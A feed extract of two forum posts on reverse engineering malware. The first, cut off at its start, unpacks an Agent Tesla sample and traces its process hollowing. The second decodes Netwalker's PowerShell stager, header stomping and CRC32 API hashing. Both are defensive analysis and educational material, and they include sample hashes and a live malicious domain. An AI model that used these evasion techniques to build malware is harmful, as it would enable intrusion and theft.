<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9f0bd64325acafb6de1996513467a1b50a0a4ffd.png" alt="" data-base62-sha1="mGZhg4IVIgmxdYkFJWXhWbvf9YV" width="624" height="88"></p>
<p>Awesome! One problem tho, if we try to access to the location of the malware we get:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/84594d1fe2937d56c81f5bf12545a25d1a4b6e54.png" alt="" data-base62-sha1="iSOlTDq6YYvszJy4bb4bjVhHFwo" width="624" height="128"></p>
<p>God damnit, we’ll have to find this file manually online! But I have one more trick up my sleeve, what If I just try to access the website as is, without trying to access the sub domain:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/46bfbb613d7828b9c2245e39ac17f9aa76f88621.png" alt="" data-base62-sha1="a5ScOJakgqwbno7zwcNndYF9Acx" width="483" height="287"></p>
<p>It’s an open directory! Hosting files called <strong>june11n</strong> and <strong>june11o</strong>! I’m writing this as of date 2020 June 11<sup>th</sup>, so the dates match but the document was viewing now as uploaded at 10<sup>th</sup>!</p>
<p>After downloading both files, I saw that june11n.exe is a zip file containing an email, and the other file was a regular exe file. I instantly assumed that this is the file that was missing holy.exe but further examining their hashes proved me wrong, but still it might be just packed differently but the final payload would be the same. For that I would need to further analyze the files.</p>
<hr>
<h2><span>Initial Stagers Part 1 Summary:</span></h2>
<p><strong>Holy.exe</strong> –</p>
<p>Status: Packed</p>
<p>SHA-256 - 29503feaa5debe98241301a773875a564f67a4183ed681bc90b582824de6944c</p>
<p><a href="https://bazaar.abuse.ch/sample/29503feaa5debe98241301a773875a564f67a4183ed681bc90b582824de6944c/" rel="noopener nofollow ugc">https://bazaar.abuse.ch/sample/29503feaa5debe98241301a773875a564f67a4183ed681bc90b582824de6944c/</a></p>
<p><a href="https://www.virustotal.com/gui/file/29503feaa5debe98241301a773875a564f67a4183ed681bc90b582824de6944c/community" rel="noopener nofollow ugc">https://www.virustotal.com/gui/file/29503feaa5debe98241301a773875a564f67a4183ed681bc90b582824de6944c/community</a></p>
<p><a href="https://analyze.intezer.com/#/analyses/c5194671-cc42-4f93-bdd9-bc8e8b575bd3/sub/78d7877a-362a-46d1-a1ae-0381d7fbbc5b" rel="noopener nofollow ugc">https://analyze.intezer.com/#/analyses/c5194671-cc42-4f93-bdd9-bc8e8b575bd3/sub/78d7877a-362a-46d1-a1ae-0381d7fbbc5b</a></p>
<p><strong>June11o.exe</strong> –</p>
<p>Status: Packed</p>
<p>SHA-256 - B539A1F17ED0C58D80F9088A7AC9985454C4922C0126FFBA86A2B0F5C42D9599</p>
<p><a href="https://www.virustotal.com/gui/file/b539a1f17ed0c58d80f9088a7ac9985454c4922c0126ffba86a2b0f5c42d9599/detection" rel="noopener nofollow ugc">https://www.virustotal.com/gui/file/b539a1f17ed0c58d80f9088a7ac9985454c4922c0126ffba86a2b0f5c42d9599/detection</a></p>
<p><a href="https://analyze.intezer.com/%23/analyses/eeef3469-99ef-440f-8956-ccb288cb801d/sub/8e9324ce-a470-46ee-abd2-d655e657e5da" rel="noopener nofollow ugc">https://analyze.intezer.com/#/analyses/eeef3469-99ef-440f-8956-ccb288cb801d/sub/8e9324ce-a470-46ee-abd2-d655e657e5da</a></p>
<p><strong><a href="http://boasteel.us" rel="noopener nofollow ugc">boasteel.us</a></strong> -</p>
<p><a href="https://whois.domaintools.com/boasteel.us" rel="noopener nofollow ugc">https://whois.domaintools.com/boasteel.us</a></p>
<p><a href="https://urlhaus.abuse.ch/browse.php?search=boasteel" rel="noopener nofollow ugc">https://urlhaus.abuse.ch/browse.php?search=boasteel</a></p>
<hr>
<h2><span>Dealing with Delphi Packers</span></h2>
<p>In this section, I’ll be unpacking our malware. Dealing with SHA-256: 29503feaa5debe98241301a773875a564f67a4183ed681bc90b582824de6944c. I would not be performing a full malware analysis scenario, which means I would solely attempt to unpack the sample as is.</p>
<p><strong><span>Static Analysis </span></strong></p>
<p><strong><span>PEStudio Artifacts:</span></strong></p>
<p>Entropy: 7.16, very high</p>
<p><strong>PE Type</strong>: PE32</p>
<p><strong>Compiler Type</strong>: Borland Delphi</p>
<p><strong>Suspicious Resources:</strong></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/dacd68086386f3796561a6aaf32359e7d63e7230.png" alt="" data-base62-sha1="vdCawiCJhyEzRmVQ8t5B58kSdji" width="624" height="183"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8159562ff884b831743dae970754c2ad576b3e19.png" alt="" data-base62-sha1="isgZN0laQx5WrCTpee2IiQjJ9G1" width="624" height="175"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/184ee3ff6c9331f4a918a3e27ff8a60e543feba2.png" alt="" data-base62-sha1="3t2tRue8zMxuLmsZUTMZtgKIKb0" width="624" height="166"></p>
<p><strong><span>IDA Artifacts:</span></strong></p>
<p><strong>Meaningful strings</strong>: None</p>
<p><strong>Meaningful Imports</strong>:</p>
<ul>
<li>Resource Imports</li>
<li>VirtualAlloc</li>
<li>Create File</li>
<li>Write File</li>
<li>CreateThread</li>
</ul>
<p><strong><span>Dynamic Analysis</span></strong></p>
<p>I decide by setting a break point on:</p>
<ul>
<li>All the resource APIs</li>
<li>VirtualAlloc</li>
<li>VirtualProtect</li>
<li>CreateThread</li>
<li>WriteFile</li>
<li>CreateFile</li>
<li>CreateProcessInternalW</li>
</ul>
<p>Additionally, to deal with Anti-RE I load Syclla-Hide.</p>
<p>I immediately break inside <strong>VirtualAlloc</strong> but only manage to get the allocated memory on the second time I hit <strong>VirtualAlloc</strong>. I decide to set up an hardware breakpoint on the first block of memory allocated and to break the debugger when it’s hit.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9a1ff4197fced7abab8b60f805a31a6e48a38de2.png" alt="" data-base62-sha1="lZrZpCMJTKXZKF3oqey83TTspxg" width="512" height="487"></p>
<p>But nothing interesting happens, I continue execution and land on <strong>LockResource</strong> twice, which means I’m accessing two of the resources but for some reason I did not break on <strong>FindResource</strong> which should be run before. Finally, after a few useless calls that lead to no where I landed on <strong>FindResourceA</strong> which passed the handle returned from it to <strong>LockResource</strong> and finally I got a handle to resource <strong>1033:</strong></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/ab77fa35f409e84ffc787f7f5ea4126d92326fb1.png" alt="" data-base62-sha1="osSHgnJ8XceRaJ1igajy9cU0poZ" width="624" height="81"></p>
<p>Then the resource is copied to a different location using <strong>VirtualAlloc</strong>:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bc2da072d6267c0a2f7b6523083c93419aa58ffd.png" alt="" data-base62-sha1="qQHwcebEJ1xoS49sJ95plVjpcMB" width="590" height="160"></p>
<p>I noticed the malware kept calling more resources again and again, without using strings to access the resource but with a unique ID and when I examined the resource section again I noticed over 200 resources that are trash:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bbf666d5699c3a410d07e9ff5a1768375c268059.png" alt="" data-base62-sha1="qONcprKIOyP6DNc3qhO4VNOx2cN" width="174" height="396"></p>
<p>And the packer was just iterating through all of them. I thought that I can just stop debugging the APIs and see if I can somehow exit this loop. I returned from the call to <strong>FindResource</strong>, and returned back to the sample execution and then I thought that if I’d simply look up my location in IDA I could quickly analyze the loop but then I realized:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/db1b6164dcdcc7b8c0f182ee3fca45c540f29c9f.png" alt="" data-base62-sha1="vgje9P1djI2pFds4nox8kCCc6Kz" width="624" height="262"></p>
<p>The sample decrypted itself, so I had to dump the PE and give it a look in IDA again:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2d944d3e605e8ec992fa4e4c3f0c65e6762ac504.png" alt="" data-base62-sha1="6vddIauGNGw9jyPQPZSQZFhJV9G" width="263" height="500"></p>
<p>This little function kept calling itself, and I could assume these four blocks simply call FindResource-&gt;LockResource-&gt;-VirtualAlloc-&gt; memcpy, when I tried to access the functions there were calling this one and view them I got even more confused since the disassembly was completely obfuscated and trashed. I decided to take my chances, remove the breakpoints set on the resources functions and continue execution hoping that <strong>VirtualProtect</strong> would eventually be hit and attempt to change some shellcode or a copied .<strong>text</strong> section to executable.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5b182928b2d25abe335f891a389b4fee3ad99abe.png" alt="" data-base62-sha1="cZRdgL6GgNqHZvRIQX5Wr2lPxFk" width="624" height="120"></p>
<p>But instead I hit <strong>CreateProcessInternalW</strong>, this API was attempting to relaunch the malware in a suspended state:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f0e94e0d7938b369983041f201caba8078f58d90.png" alt="" data-base62-sha1="yncrFIluw15SENV9LyrC3fxOMLe" width="142" height="79"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4751e187b6023d36c4782399b5a838ad407b6300.png" alt="" data-base62-sha1="aaVkqVB65eRjDAWHp1SGhtoxeUw" width="624" height="34"></p>
<p>I decided to return set the breakpoints again on <strong>VirtualAlloc</strong> and <strong>WriteProcessMemory</strong>. I hit run and crashed!</p>
<p>Alright at least I know where I’m crashing, I restarted the sample and waiting till I hit <strong>CreateProcessInternal</strong>. After I hit it, I returned out of the API and kept stepping until I hit a suspicious functions:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1d9b2f58bc58149ed63781c90c4fdba97e8b87bd.png" alt="" data-base62-sha1="4dUko8AAdgVRTLL98ChYsQyT3nT" width="624" height="78"></p>
<p>I decided not to skip it and examined the registers and I noticed one of them was pointing to a string with the value <strong>“PE”</strong>. PE Is the value of the Signature filed inside the IMAGE_NT_HEADERS. I quickly examined where the register was pointing at:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f6b3d07f5cd6b24a62c58b2f3ed8167e6671a0d1.png" alt="" data-base62-sha1="zcqHV5f7PfejQaGn1614QCTPtKx" width="595" height="166"></p>
<p>It’s a valid PE file! Alright so before I jump into my suspicious function I decide to dump this memory region:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e29aa314860286c44a997575a8c5ae9534047968.png" alt="" data-base62-sha1="wkDdqK2qFjWHlijgeXvmxXArZ0I" width="453" height="24"></p>
<p>As we can see it is still not executable so perhaps its also unmapped:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e181115e35a3c89c5a76430ffa9a3f1ca9fc6673.png" alt="" data-base62-sha1="waTXmmC4lkhnjKGxGZhJBVY3aRJ" width="624" height="184"></p>
<p>The file is UPX packed! Alright so I can assume this is the second stage packing but before I confirm this I want to know where does my suspicious function lead.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c18e69c32ab60ac564f265ac3ddc4ecc3bc08ec1.png" alt="" data-base62-sha1="rChgLUMEpkMAdwfMOUdsUbTGUWl" width="621" height="24"></p>
<p>Our function calls <strong>ZwCreationSection</strong>, which is usually for me the first indicator of process hollowing, it does so for the new process we spawned. Then on the function calls <strong>ZwMapViewOfSection</strong> on new section, next the malware calls <strong>ZwMapViewOfSection</strong> on itself, which means its going to map the <strong>ImageBase.</strong></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1a2a6f10c65af67c39f74754eadcd5b3dc8bab81.png" alt="" data-base62-sha1="3Jtkm7w7uSJn0ZAM0l1gOCRYDnz" width="223" height="115"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/ea66cc8da21dfa04f0c70d4726ebe64a94c7e9c4.png" alt="" data-base62-sha1="xrBYo4unjyVf9KF19IuWqbvB1R2" width="170" height="18"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/574adbd182742646ce3ad83a66c5c99beb4e1587.png" alt="" data-base62-sha1="csdVhoA5Wr0ARA8O4xGKh14o1oj" width="624" height="18"></p>
<p>Then the malware does something interesting:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1d99ee6208085e94477bda7acf24ce673481612b.png" alt="" data-base62-sha1="4dRDQtbZ8og075Jr2EZtZA9ZBYD" width="624" height="83"></p>
<p>It enters a loop, where it begins to copy the new UPX file we dumped, byte by byte into the new section we created until eventually:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/ba8b119fa680bba359898371e6563422c4d21be5.png" alt="" data-base62-sha1="qCeLjrPnXFXaVMNvlRn1FlPzNkh" width="583" height="150"></p>
<p>The malware copies the entire new file into this section. After the copying is complete, the malware attempts to get the context of the main thread of the new sub process, how do I know this? First let’s look at the stack before the <strong>GetThreadContext</strong>:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c5e5ee300b9f0270cd5ecef978d92aec9aa265a6.png" alt="" data-base62-sha1="seGGupXREozAeYVeJPcrT0gUGTI" width="338" height="44"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e31f75c678d6dc442ece3ed6d9ad1546250548f7.png" alt="" data-base62-sha1="wpdMTBvTZLaeLEz2hoATWNv6fcP" width="624" height="17"></p>
<p>This thread handle belongs to PID <strong>EF4</strong>:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bd001da845045f15608d1d5cc5b1bffc48d2c6a8.png" alt="" data-base62-sha1="qXYuo1hPqKhg1VUFTjKkApb8ahi" width="380" height="46"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7d0577bcd00b31449d80f9aca78d276e6e55cb6b.png" alt="" data-base62-sha1="hPZoHgyiW6mHfsZgTx00UaugU9Z" width="157" height="77"></p>
<p>It changes the process thread context to a new thread, which will execute the new file and invokes <strong>NtResumeThread</strong> to continue execution of the new subprocess:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b04ba57139259aad6ef3850879444e168a18f227.png" alt="" data-base62-sha1="p9A6A5crTse3GQnzhsOWJFVR5JB" width="572" height="35"></p>
<p>Let’s prove this hypothesis. Let’s access the new sub process in process hacker and view its memory:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8257b67a4b621e64e6fbc6015771e46ece102711.png" alt="" data-base62-sha1="iB3ZGG05U9lZcTUavlcNI44jUmR" width="624" height="32"></p>
<p>And dump it.</p>
<p>Let’s examine our mapped PE:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/aa272404f98a92b9bc5808c3a2a7a19ecbd0deb8.png" alt="" data-base62-sha1="ohf1LIbCbdKDLKMXPvXwqRYLFc4" width="624" height="190"></p>
<p>It matches our dumped PE exactly; the only difference is that its mapped to memory. So essentially what happened is very simple, our packed malware started a new sub process of itself, it mapped the original old <strong>ImageBase</strong> to memory and it mapped the other embedded <strong>UPX</strong> PE into memory. then it took the <strong>UPX</strong> PE memory and simply overwritten the new sub processes memory. after it completed it simply returns execution on the new PE. This is classic Process Hollowing. The PE seems unmapped so we can simply dump it.</p>
<p>I’ve used CFF Explorer to unpack it, upon viewing it seems it’s just a launcher. Its code section is small, containing two .text sections, The WinMain function is very linear. Usually there is a PE embedded within such a launcher that is executed in various techniques and if we examine the resource section</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/46d4f8bc0428629564fe420f8d10dbcb7d561a56.png" alt="" data-base62-sha1="a6BIaVAWhftPifo5MBS5tSP6PmS" width="624" height="125"></p>
<p>Well, this isn’t very stealthy… ahaha alright let’s dump this out.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4a67d869cac475f1e8ea308b8dc69cbf3506a935.png" alt="" data-base62-sha1="aCdORVmVLmJgpV6bSYkyygP6ZrT" width="516" height="273"></p>
<p>I suspect this is the final payload, as this a .NET file and the verdict on malware bazaar was Agent Tesla. Let’s look this file up in <strong>VirusTotal and Intezer:</strong></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6e86e7dc9b8ad5e25a97eae217ddab817f105287.png" alt="" data-base62-sha1="fLLysSwCTfeO29aqCQBS0K1MbHx" width="624" height="221"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/09892a7fa322db45d5fe267cbcbcdde9ca96c4e9.png" alt="" data-base62-sha1="1mmaN4fNsDW9hfijsDqxFvoJV0d" width="624" height="255"></p>
<p>The verdict is clear, it’s Agent Tesla packed with <strong>ConfuserEx</strong>. We can use de4dot to deobfuscate <strong>ConfuserEx</strong> and continue analysis but that is beyond the scope of this post.</p>
<p>I hope you guys enjoyed this one <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p><span><a href="https://analyze.intezer.com/?utm_campaign=website%20to%20community&amp;utm_source=GetStarted%20#/analyses/f704c668-999c-4c7c-9941-9c19a8fb60de/sub/3f32622a-8f38-485a-9add-eea25f2beede" rel="noopener nofollow ugc">https://analyze.intezer.com/?utm_campaign=website%20to%20community&amp;utm_source=GetStarted%20#/analyses/f704c668-999c-4c7c-9941-9c19a8fb60de/sub/3f32622a-8f38-485a-9add-eea25f2beede</a></span></p>
<hr>
<h2><span>Unpacking Delphi PE Summary:</span></h2>
<p><strong>Packed SHA-256:</strong></p>
<p>29503FEAA5DEBE98241301A773875A564F67A4183ED681BC90B582824DE6944C</p>
<p><strong>Unpacked SHA-256(UPX PE):</strong></p>
<p>F3112BD51886FB705F33BEA0DDFA708AE6BABAB6F93162ABFDB931095EC6D116</p>
<p><strong>Unpacked UPX SHA-256:</strong></p>
<p>09A21333C61AA0DE5148E97AA238B8F8295E100891AA6A4F1F1108B27752FAD3</p>
<p><strong>Unpacked Resource SHA-256:</strong></p>
<p>c9b206aeded0795594a450b5717e65ba934c0dfab6005a8c696bd991ba96db15</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/zero2auto-initial-stagers-from-one-email-to-a-trojan/21722">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/zero2auto-initial-stagers-from-one-email-to-a-trojan/21722</link>
          <pubDate>Thu, 11 Jun 2020 17:12:54 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-21722</guid>
          <source url="https://d.clarkee.co.uk/t/zero2auto-initial-stagers-from-one-email-to-a-trojan/21722.rss">[Zero2Auto] – Initial Stagers - From one Email to a Trojan</source>
        </item>
        <item>
          <title>[Quickie] Zero2Auto Malware Course Homework</title>
          <dc:creator><![CDATA[Danus]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h3>Zero2Auto – Deep Dive into Netwalker</h3>
<h2>Preface</h2>
<p>Recently, I’ve joined @<a href="https://twitter.com/VK_Intel" rel="noopener nofollow ugc">VK</a> and @<a href="https://twitter.com/0verfl0w_" rel="noopener nofollow ugc">0verflows</a> advanced malware analysis course called “<a href="https://courses.zero2auto.com/" rel="noopener nofollow ugc">Zero2Auto</a>”. The first lesson was about algorithms in malware; compression, hashing and encryption. The first lesson was supplied with a PDF which is now released as a <a href="https://zero2auto.com/2020/05/19/netwalker-re/" rel="noopener nofollow ugc">post by Vitaly</a> based on another post about the <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/netwalker-fileless-ransomware-injected-via-reflective-loading/" rel="noopener nofollow ugc">Netwalker sample</a>. I was thinking on how I could practice this lesson, and I concluded that a simple thing I could do is expand upon these two posts as they were not detailed enough for most beginner reverse engineers. My main goal would be to prove the assumed findings in Vitaly’s post by expanding on the mechanisms detailed within it and to detail new findings that might relate to the lessons subject which is how to recognize known encoding algorithms and automate them.</p>
<hr>
<h3>Required prior knowledge:</h3>
<ul>
<li>X86 Assembly</li>
<li>IDA Pro and x64dbg Knowledge</li>
<li>Basic Powershell skills</li>
</ul>
<hr>
<h3>Dealing with the first stage PowerShell</h3>
<p>The first thing we’ll do is download the sample referenced in both blog posts mentioned above:</p>
<p>SHA-256 hash of the sample: <a href="https://any.run/report/f4656a9af30e98ed2103194f798fa00fd1686618e3e62fba6b15c9959135b7be/ca44ad38-0e46-455e-8cfd-42fb53d41a1d" rel="noopener nofollow ugc">f4656a9af30e98ed2103194f798fa00fd1686618e3e62fba6b15c9959135b7be</a></p>
<p>This is a very long and obfuscated <strong>PowerShell</strong> script, it’s so long that I couldn’t even load it into my VM’s PowerShell ISE without it crashing, so I decided that I can circumvent this by loading the script into Sublime(which is the best text editor on earth).</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c7bcf004cbfeb2ca11d0a933d3a5b731bf897392.png" alt="" data-base62-sha1="suXOr6y3Ski2DsH7UjcyOq6iots" width="624" height="112"></p>
<p>The script might be long and scary but do not fear, for all we need to do is examine the first line of the code:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7104e7a552fc995dfda3849de798dccd8604780f.png" alt="" data-base62-sha1="g7OsGXsQNxMd5i9DdMCbHxwb5dd" width="624" height="17"></p>
<p>The first command “Invoke Expression” will simply run the command wrapped inside “$()”, within this statement we can see that the statement will perform base64 decoding. So to decode the first stage obfuscation, we can simply remove the Invoke expression command and pipe the entire decoded string to a text file using <strong>“| Out-File -FilePath .\Process.txt”</strong> and this would result in the following decode payload. The second stage payload is nothing but the same scary mess, but this time a long bytearray is being decrypted within a loop, it simply <strong>XORs</strong> each byte within that array with 0x47.</p>
<p>Again, all I decide to do is to pipe the final product to a text file:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/62ae87e331fa3a358ce55ebe33e8dfc92ce94e95.png" alt="" data-base62-sha1="e4YINPyIXzJGrZ5Zu6qF2WQ4vdj" width="580" height="29"></p>
<p>We reach the second stage payload, which contains 2 long bytearrays – which as stated within the blog posts are two DLL files representing <strong>x86</strong> and <strong>x64</strong> versions of the malware DLL that would be loaded into the memory of <strong>explorer.exe</strong>. I’m merely interested in the bytearray representing the x86 DLL. Using sublime text I can click <strong>cntrl+shift+l</strong> and click on the last line of the first byte array – I’ll copy this bytearray to another script file, then I’ll simply invoke a PowerShell command to write this byte array to a file. It’s worth noting that for some reason sublime text appended newline characters at the last character in each line so running this script wont work unless you replace all new line characters within the script.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/faf7e1e6ece4d7a1e9c38682fbdbf20253049268.png" alt="" data-base62-sha1="zOas6mGwtM83RvvNHELhQ660u3m" width="556" height="72"></p>
<h3>Reversing the Netwalker x86 DLL:</h3>
<p>Let’s throw the file in <strong>PEBear</strong> and see if we can find anything interesting:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0d748aafa61973ec15ab4d328bb7c4c0f473150e.png" alt="" data-base62-sha1="1V1TAIk01fOivLILx7TwYusuBqu" width="516" height="164"></p>
<p>What is this? Ah yes, do not worry the malware author corrupted the PE File header and replaced the “MZ” characters with the header with a word value 0xDEAD (remember this).</p>
<p>What I’ll do, is replace this value using <strong>HxD</strong> to a proper PE header so we could examine it within IDA and Resource Hacker:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a376b1929b5838c661d93f56c4d191c20d0e3135.png" alt="" data-base62-sha1="nk47UEseJlr5EYC62sEsuTcS2Lr" width="624" height="214"></p>
<p>Much better!</p>
<p>Usually, upon reaching this point I would perform basic static analysis by examining the file’s strings, view any anomalies within its header and examine its resources. Then I would perform basic dynamic analysis by running the sample and monitor it, but we must remember our initial goal – we must expand upon Vitaly’s findings and find any worthwhile material we can explore ourselves. So first let’s examine Vitaly’s first mention of CRC32:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/786dcb253e35be9db36c2028fc0a2ad3c73c2961.png" alt="" data-base62-sha1="hbmwJIs190ILzmIcHMPGtEwyRGN" width="375" height="500"></p>
<p>How did Vitaly know this is indeed a <strong>CRC32</strong> hashing algorithm? Well lets start by utilizing the KANAL plugin within PEid, I’ll load the malware into <strong>PEid</strong> and launch the <strong>KANAL</strong> tool:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bd2c4fbc31233ed73ccb02f19092d896880ddbd8.png" alt="" data-base62-sha1="qZvb5h1gbNpS0D7urigpJzo2s6A" width="372" height="172"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0cf6912718ec7f6d1cd03a325d2458d5dd1e3ea6.png" alt="" data-base62-sha1="1QFZOw1fK5VadXO7j5hPjUBl2zY" width="377" height="60"></p>
<p>As we can see, KANAL recognizes that there is a reference for the CRC32 algorithm within a lot of locations but what exactly did it find there? Let’s jump to 0x1000424F</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d52c54b61b6d7bec7f358fd956323f64d512accb.png" alt="" data-base62-sha1="upOG8Sq4gIc37yMER0g5hEmzDBN" width="173" height="475"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3c4c19898b4ee525fef4c3e6ffcf62a6b3a8cfff.png" alt="" data-base62-sha1="8BpGQYkVGLXhuNqM6DW8YbWROrl" width="221" height="72"></p>
<p>What is this constant? Let’s google it:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/264a4fa21fdd2e549bf72e59f5e4d60c6b7b1a3f.png" alt="" data-base62-sha1="5sJlZ6jCyFM7NAFTqysgmO5luEL" width="402" height="290"></p>
<p>Aha, alright – even if one would view how <a href="https://stackoverflow.com/questions/2587766/how-is-a-crc32-checksum-calculated" rel="noopener nofollow ugc">crc2 checksum is calculated</a> one could quickly see the recognizable division flow at 0x1000421C.</p>
<p>When dynamically analyzing the file, at location <strong>0x10001A59</strong> one can see that the value <strong>0x3e006b7a</strong> is resolved as <strong>FindResourceA</strong>.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7c81c028c89b018df3b101448524dde108950f8a.png" alt="" data-base62-sha1="hLrc8vxGCDBi6n13JZdS9olO9uy" width="690" height="38"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/86462e32687373031baf2c13c11e89bf447a2973.png" alt="" data-base62-sha1="j9QlcyfibrfKqIEuLrDfAQk93yP" width="442" height="54"></p>
<p>How NetWalker utilizes <strong>PE</strong> Header stomping to break analysis</p>
<p>Let’s examine the following assumption made in Vitaly’s blog:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/ff9058c1b80ec12f25929c6dea702b9d391f088f.png" alt="" data-base62-sha1="AsP10S0oobcBdiaEVKFwT5C3AYf" width="624" height="301"></p>
<p>At location <strong>0x1000A0B0</strong> one can find the <strong>API</strong> resolving function:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6ef3249d172a2ab7611d3dff103871cae7d23824.png" alt="" data-base62-sha1="fPvs6niCu6gpeivcRSi3rSHRYI4" width="521" height="188"></p>
<p>So, I assumed Vitaly is referencing the content with <strong>sub_1003710</strong></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/42dc253a11b742c6b8c118f4e7b294407a84df5f.png" alt="" data-base62-sha1="9xtaGP7TPxeRGI5aExvDwCnEWez" width="285" height="445"></p>
<p>And indeed, he was, how ever by simply breaking on this location and running the sample it would crash. I decided to attempt to understand why this was happening. First attempted to skip the call at <strong>0x1000371E</strong> which I renamed to <strong>func_checkValidHeader</strong> but I this function crashed the sample every time with a access violation exception, so lets take a look at it.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a3fce9ed50fb1723e25d673342739ca5dcef162c.png" alt="" data-base62-sha1="noHGXHV8r7aQZcxLmGPzW6JwJmk" width="204" height="265"></p>
<p>First, it loads the offset of the current function into <strong>EAX</strong> and <strong>ANDs</strong> it with <strong>0xFFFF000</strong>. It would then begin to iterate through a loop, subtracting <strong>0x800</strong> from <strong>EAX</strong> and attempting to locate the value <strong>0xDEAD</strong> within the address referenced in <strong>EAX</strong>. Sounds familiar? Sure does – as we recall the DLL PE header was stomped with <strong>0xDEAD</strong>, this code routine is attempting to validate that no one tampered with the sample.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c7fc199eb8d0c8f8d6a1b95eb95abb0d39da9f41.png" alt="" data-base62-sha1="sx98AzlaOcV6SLHniih5bu7vvwd" width="514" height="63"></p>
<p>Since I modified the header, the sample would get stuck in an infinite loop until <strong>EAX</strong> would point to an invalid memory location resulting an access violation exception – to add to this finding if we go to address <strong>0x1000372D</strong> the sample attempts to fix the stomped header using the value returned by <strong>func_checkValidHeader</strong> which should point to the base address of the DLL. It would then replace <strong>0xDEAD</strong> with “MZ” thus fixing the header.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/63c6ecaaf28926f83971f59a415c0f0dceebda64.png" alt="" data-base62-sha1="eeFsIYR9ulgJhpi7B2UtdXx3eMQ" width="601" height="153"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1100f5ca50d6e15f11f699a7ea19bee7a6c44292.png" alt="" data-base62-sha1="2qqaN10C7E9iZRt0hMEMDidMQJc" width="126" height="22"></p>
<p>To quickly solve this issue, I just patched the binary by removing the header patcher and that solved the problem.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cdd13d97e5d37c9190f0580d549cb7ba95b568a4.png" alt="" data-base62-sha1="tmKaZLmF9c9kVgcl9n8rYEygGVe" width="617" height="210"></p>
<p>We can indeed verify Vitay’s findings after this as the sample doesn’t crash. First the sample loads the resource, locks it.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3927ef1d6cd247a612c1f84ef4fa87a46888a4d6.png" alt="" data-base62-sha1="89CLZFvFZ9lJy7amFGdebNbGgzs" width="285" height="422"></p>
<p>The malware then loads the resources size and allocates a buffer within the heap to load the resource into it using <strong>memcpy</strong>.</p>
